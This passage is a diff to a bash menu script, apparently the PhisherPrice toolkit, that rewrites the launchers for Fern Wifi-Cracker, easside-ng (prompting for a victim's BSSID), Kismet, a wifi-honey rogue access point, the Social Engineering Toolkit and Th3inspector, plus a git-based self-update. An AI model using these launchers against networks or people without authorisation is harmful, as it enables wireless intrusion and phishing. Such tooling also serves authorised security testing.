-read
+echo -e "\n**************************************************"
+echo "******     Bullying complete     ******"
+echo -e "**************************************************\n"
+
+read -p "Press Enter to continue."
 
 elif [ "$x" == "$blueranger" ]; then                          #BlueRanger
-echo "Are You Sure You Want To Start Fern ?"
-echo "Press ENTER For YES Any Other Key To Go Back"
-read Bluerange
 clear
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!!!  Starting Fern Wifi-Cracker  !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
-'
+echo -e "\n**************************************************"
+echo "******     Fern Wifi-Cracker Launcher     ******"
+echo -e "**************************************************\n"
 
-$Bluerange fern-wifi-cracker
+read -p "Are you sure you want to start Fern Wifi-Cracker? (y/n): " start_fern
 
-read
+if [[ $start_fern =~ ^[Yy]$ ]]; then
+  clear
+  echo -e "\n**************************************************"
+  echo "******     Starting Fern Wifi-Cracker     ******"
+  echo -e "**************************************************\n"
+
+  fern-wifi-cracker
+else
+  clear
+  echo -e "\n**************************************************"
+  echo "******     Operation cancelled     ******"
+  echo -e "**************************************************\n"
+fi
+
+read -p "Press Enter to continue."
 
 elif [ "$x" == "$eeng" ]; then                          #BlueRanger
 clear
-echo -e '\e[1;33m
-___________                    .__    .___                               
-\_   _____/____    ______ _____|__| __| _/____             ____    ____  
- |    __)_\__  \  /  ___//  ___/  |/ __ |/ __ \   ______  /    \  / ___\ 
- |        \/ __ \_\___ \ \___ \|  / /_/ \  ___/  /_____/ |   |  \/ /_/  >
-/_______  (____  /____  >____  >__\____ |\___  >         |___|  /\___  / 
-        \/     \/     \/     \/        \/    \/               \//_____/  \e[1;34m
-'
-echo "Are You Sure You Want To Start Easside ?"
-read buddytheelf
-echo "Enter Victims BSSID Looks Like This : de:ad:be:ef:ca:fe"
-read vbssid
-echo "Enter Source MAC address"
-read srcmac
-echo "Enter Buddy-ng IP address (mandatory) Usually: 127.0.0.1"
-read srcip
-echo "Enter Your InterFace wlan0mon or wlan1mon"
-read easymc
-echo "Enter The Channel ID eg: 6 "
-read easychan
+echo -e "\n**************************************************"
+echo "******     Easside-NG Launcher     ******"
+echo -e "**************************************************\n"
+
+read -p "Are you sure you want to start Easside-NG? (y/n): " easside_choice
+
+if [[ $easside_choice =~ ^[Yy]$ ]]; then
+  echo "Enter victim's BSSID (e.g. de:ad:be:ef:ca:fe): "
+  read vbssid
+  
+  echo "Enter source MAC address: "
+  read srcmac
+  
+  echo "Enter Buddy-ng IP address (mandatory), usually 127.0.0.1: "
+  read srcip
+  
+  echo "Enter your interface (e.g. wlan0mon or wlan1mon): "
+  read easymc
+  
+  echo "Enter the channel ID (e.g. 6): "
+  read easychan
+  
+  clear
+  
+  echo -e "\n**************************************************"
+  echo "******     Starting Fern Easside-NG     ******"
+  echo -e "**************************************************\n"
+  
+  xterm -e "buddy-ng" &
+  sleep 1
+  
+  easside-ng -v $vbssid -m $srcmac -s $srcip -f $easymc -c $easychan
+  
+else
+  
+  echo -e "\n**************************************************"
+  echo "******     Operation cancelled     ******"
+  echo -e "**************************************************\n"
+fi
+
+read -p "Press Enter to continue."
+
+elif [ "$x" == "$kissmet1" ]; then                          #kissmet
 clear
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!!!   Starting  Fern Easside-NG  !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
-'
+echo -e "\n**************************************************"
+echo "******        Kismet Launcher        ******"
+echo -e "**************************************************\n"
 
-$buddytheelf gnome-terminal -x sh -c "buddy-ng; bash"
+read -p "Are you sure you want to start Kismet? (y/n): " kissmebaby
 
-easside-ng -v $vbssid -m $srcmac -s $srcip -f $easymc -c $easychan
+if [[ $kissmebaby =~ ^[Yy]$ ]]; then
+  clear
+  echo -e "\n**************************************************"
+  echo "******        Starting Kismet        ******"
+  echo "******  To Stop Kismet CTRL + C     ******"
+  echo -e "**************************************************\n"
+  
+  kismet
+else
+  clear
+  echo -e "\n**************************************************"
+  echo "******     Operation cancelled     ******"
+  echo -e "**************************************************\n"
+fi
 
-read
-
-elif [ "$x" == "$kissmet1" ]; then                          #routersploit
-clear
-echo -e '\e[1;33m
- ____  __.__          _____          __   
-|    |/ _|__| ______ /     \   _____/  |_ 
-|      < |  |/  ___//  \ /  \_/ __ \   __\
-|    |  \|  |\___ \/    Y    \  ___/|  |  
-|____|__ \__/____  >____|__  /\___  >__|  
-        \/       \/        \/     \/      \e[1;34m
-'  
-echo "Are You Sure You Want To Start Kismet ?"
-read kissmebaby
-clear
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!!!     Starting  Kismet         !!!!!
-!!!!!  To Stop Kismet CTRL + C     !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
-'
-$kissmebaby kismet
-
-read
+read -p "Press Enter to continue."
 
 elif [ "$x" == "$whoney" ]; then                          #routersploit
 clear
-echo -e '\e[1;33m
- __      __.______________.___    ___ ___                     _____.___.__________       __   
-/  \    /  \   \_   _____/|   |  /   |   \  ____   ____   ____\__  |   |\______   \_____/  |_ 
-\   \/\/   /   ||    __)  |   | /    ~    \/  _ \ /    \_/ __ \/   |   | |     ___/  _ \   __\
- \        /|   ||     \   |   | \    Y    (  <_> )   |  \  ___/\____   | |    |  (  <_> )  |  
-  \__/\  / |___|\___  /   |___|  \___|_  / \____/|___|  /\___  > ______| |____|   \____/|__|  
-       \/           \/                 \/             \/     \/\/                             \e[1;34m
-'  
-echo "Are You Sure You Want To Start HoneyPot ?"
+echo "Are you sure you want to start HoneyPot?"
 read hpot
-echo "enter a wifi name of your choice"
-read wifiname
-echo "enter wifi channel you wish to broadcast on eg: 6 or 11"
-read wifichannel
-echo "Enter Your Interface: wlan0 or wlan1"
-read hpotif
-clear
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!!!     Starting  HoneyPot       !!!!!
-!!!!!  To Stop HoneyPot CTRL + C   !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
-'
-$hpot airmon-ng check kill
 
-wifi-honey $wifiname $wifichannel $hpotif
+if [[ $hpot =~ ^[Yy]$ ]]; then
+  echo "Enter a wifi name of your choice: " 
+  read wifiname
+  echo "Enter wifi channel you wish to broadcast on (e.g. 6 or 11): " 
+  read wifichannel
+  echo "Enter your Interface (e.g. wlan0 or wlan1): " 
+  read hpotif
 
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!       To Disbale Monitor Mode        !
-! sudo service network-manager restart !
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
-'
+  clear
+  echo -e "\n**************************************************"
+  echo "******        Starting HoneyPot...      ******"
+  echo -e "**************************************************\n"
 
-read
+  airmon-ng check kill
+  wifi-honey $wifiname $wifichannel $hpotif
+
+  read -p "Press Enter to disable monitor mode and continue." confirm
+
+  if [[ $confirm =~ ^[Yy]$ ]]; then
+    sudo service network-manager restart
+  else
+    echo -e "\n**************************************************"
+    echo "******  Monitor mode has not been disabled. ******"
+    echo -e "**************************************************\n"
+  fi
+
+  read -p "Press Enter to continue."
+else
+  clear
+  echo -e "\n**************************************************"
+  echo "******        Operation cancelled        ******"
+  echo -e "**************************************************\n"
+fi
+
+read -p "Press Enter to continue."
 
 else 
 
@@ -2445,7 +2857,7 @@ echo -e '\e[1;33m
   \_  /_/   /.
    \__/_   <    AutoExif Tool
    /<<< \_\_  PhisherPrice
-  /,)^>>_._ \ Version 2.9 
+  /,)^>>_._ \ Version 3.0 
   (/   \\ /\\\
        // //```
 ======((`((====\e[1;34m
@@ -2688,9 +3100,8 @@ when the script is in the media folder you want you can just type the
 Image name Along with file type instead of typing the image location aswell
 For eg: instead of /home/username/Pictures/lulz.png
 I would just type : lulz.png
-                          Press ENTER To Go Back To The Main Menu
 '
-read
+read -p "Press Enter to continue."
 
 
 else 
@@ -2703,84 +3114,146 @@ fi
 
 elif [ "$x" == "$option7" ]; then                          #Option7
 clear
-	echo -e "${banner}"
-	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                     
-                   '
-echo -e '\e[1;33m
-  _________    ___________ ___________           .__   __   .__  __   
- /   _____/    \_   _____/ \__    ___/___   ____ |  | |  | _|__|/  |_ 
- \_____  \      |    __)_    |    | /  _ \ /  _ \|  | |  |/ /  \   __\
- /        \     |        \   |    |(  <_> |  <_> )  |_|    <|  ||  |  
-/_______  / /\ /_______  /   |____| \____/ \____/|____/__|_ \__||__|  
-        \/  \/         \/                                  \/       \e[1;34m
-'  
-echo "Are You Sure You Want To Start SE Toolkit?"
-echo "Press ENTER For Yes Press Any Other Option For No."
-read pi9host
-clear
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-! Starting Social Engineering Toolkit  !
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
-'
+echo "Are you sure you want to start SE Toolkit?"
+read -p "Press ENTER to confirm or any other key to cancel." confirm
 
-$pi9host sudo setoolkit
+if [[ "$confirm" =~ ^([yY][eE][sS]|[yY])$ ]]; then
+  clear
+  echo -e "\n**************************************************"
+  echo "******  Starting Social Engineering Toolkit... ******"
+  echo -e "**************************************************\n"
+  
+  if sudo setoolkit; then
+    clear
+    echo -e "\n**************************************************"
+    echo "******          SET has been closed         ******"
+    echo -e "**************************************************\n"
+  else
+    clear
+    echo -e "\n**************************************************"
+    echo "******        Error running SET...         ******"
+    echo "******  Please check your installation.   ******"
+    echo -e "**************************************************\n"
+  fi
+
+else
+  clear
+  echo -e "\n**************************************************"
+  echo "******        Operation cancelled.         ******"
+  echo -e "**************************************************\n"
+fi
+
+read -p "Press Enter to continue." 
 
 elif [ "$x" == "$option8" ]; then                          #Option9
 clear
-echo "Are You Sure You Want To Start SE Toolkit?"
-echo "Press ENTER For Yes Press Any Other Option For No."
-read pi1337host
-clear
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!   Please Wait Loading Th3inspector   !
-!  To Exit Th3inspector Press ENTER    !
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! 
-'
-$pi1337host Th3inspector
+
+echo "Are you sure you want to start Th3inspector?"
+read -p "Press ENTER to start or any other key to exit." answer
+
+if [[ $answer == "" ]]; then
+    clear
+    echo -e '\n**************************************************'
+    echo "******      Loading Th3inspector...     ******"
+    echo -e '**************************************************\n'
+
+    $pi1337host Th3inspector
+
+    clear
+    echo -e '\n**************************************************'
+    echo "******    Th3inspector has been closed.  ******"
+    echo -e '**************************************************\n'
+else
+    clear
+    echo -e '\n**************************************************'
+    echo "******         Operation cancelled.        ******"
+    echo -e '**************************************************\n'
+fi
+
+read -p "Press Enter to continue."
 
 elif [ "$x" == "$update" ]; then                 #Update
-echo "This Script is Only Intended for Kali Linux And Similar OS"
+clear
+if [ -f /etc/debian_version ]; then
+    OS="Debian"
+elif [ -f /etc/arch-release ]; then
+    OS="Arch"
+elif [ -f /etc/lsb-release ]; then
+    . /etc/lsb-release
+    OS=$DISTRIB_ID
+elif [ -f /etc/os-release ]; then
+    . /etc/os-release
+    OS=$NAME
+elif [ -f /etc/backbox-release ]; then
+    OS="BackBox"
+elif [ -f /etc/rpi-issue ]; then
+    OS="Raspbian"
+elif [ -d "$HOME/.termux" ]; then
+    OS="Termux"
+else
+    echo "This script is only intended for Debian, Ubuntu, Arch, Kali, BackBox, Raspbian, and Termux."
+    exit 1
+fi
 
-git clone https://github.com/sircryptic/phisherprice
-cd phisherprice && sudo bash ./update.sh
-sudo phisherprice
+if [ "$OS" != "Debian" ] && [ "$OS" != "Ubuntu" ] && [ "$OS" != "Arch" ] && [ "$OS" != "Kali" ] && [ "$OS" != "BackBox" ] && [ "$OS" != "Raspbian" ] && [ "$OS" != "Termux" ]; then
+    echo "This script is only intended for Kali Linux and similar OS."
+    exit 1
+fi
+
+SCRIPT_NAME="phisherprice"
+
+REPO_URL="https://github.com/sircryptic/phisherprice.git"
+
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+
+LOCAL_REPO_DIR="${SCRIPT_DIR}/${SCRIPT_NAME}"
+
+check_updates() {
+    remote_hash=$(git ls-remote "${REPO_URL}" HEAD | awk '{print $1}')
+
+    cd "${LOCAL_REPO_DIR}"
+    local_hash=$(git rev-parse HEAD)
+
+    if [[ "${remote_hash}" != "${local_hash}" ]]; then
+        read -p "A new version of ${SCRIPT_NAME} is available. Do you want to update? [y/n] " choice
+        case "$choice" in 
+          y|Y ) 
+            git pull
+            echo "${SCRIPT_NAME} updated to the latest version.";;
+          n|N ) 
+            echo "Skipping ${SCRIPT_NAME} update.";;
+          * ) 
+            echo "Invalid choice. Skipping ${SCRIPT_NAME} update.";;
+        esac
+    fi
+}
+
+check_updates
+
+if [[ ! -d "${LOCAL_REPO_DIR}" ]]; then
+    git clone "${REPO_URL}" "${LOCAL_REPO_DIR}"
+else
+    cd "${LOCAL_REPO_DIR}"
+    git pull
+fi
+
+sudo "${LOCAL_REPO_DIR}/${SCRIPT_NAME}"
 
 elif [ "$x" == "$contact" ]; then                 #CONTACTME                    
 
 clear
 
-echo -e '\e[1;33m
-\e[0m
- \e[1;31m
- If You Have Any Issues Then Feel Free 
- To file a issue on git
-'
-echo -e '\e[1;34m
-I Would Personally Like To Thank \e[1;33mJack \e[1;34m Over @ \e[1;32m Kali Hacking Community Discord Server\e[1;34m
-For Being My Motivation To Keep Making This Too,
-sadly this tool is no longer going to be updated much longer and the original khc community sank
-farewell to all those i personally knew
-I Would Also Like To Thank \e[1;35mKiera<3 \e[1;34m over @KCH For Making Me Aware Of Bugs
-Without People Like This I Probably Would Have Been Oblivious. 
-So Thankyou Once Again To All Those That Made This Possible & Gave Me Inspiration. 
-- \e[1;31m SirCryptic \e[1;34m
-                          Press ENTER To Go Back To The Main Menu
-'
-read
-
+echo -e "\e[1;33m\nIf you have any issues, feel free to file a bug report on Git.\e[0m\n"
+echo -e "\e[1;34mI would personally like to thank \e[1;35mJack \e[1;34mover at \e[1;32mKali Hacking Community Discord Server\e[1;34m for being my motivation to keep making this tool. Sadly, this tool is no longer going to be updated much longer, and the original KHC community sank. Farewell to all those I personally knew.\nI would also like to thank \e[1;35mKiera<3 \e[1;34mover @KCH \e[1;34mfor making me aware of bugs. Without people like this, I probably would have been oblivious. So thank you once again to all those that made this possible and gave me inspiration.\n- \e[1;31mSirCryptic \e[1;34m\n"
+read -p "Press Enter to continue."
 
 else 
 
 n
 
-
 fi
 
 done
-
 	exit 1
 	fi
 	if [[ -z "$dldir" ]]; then
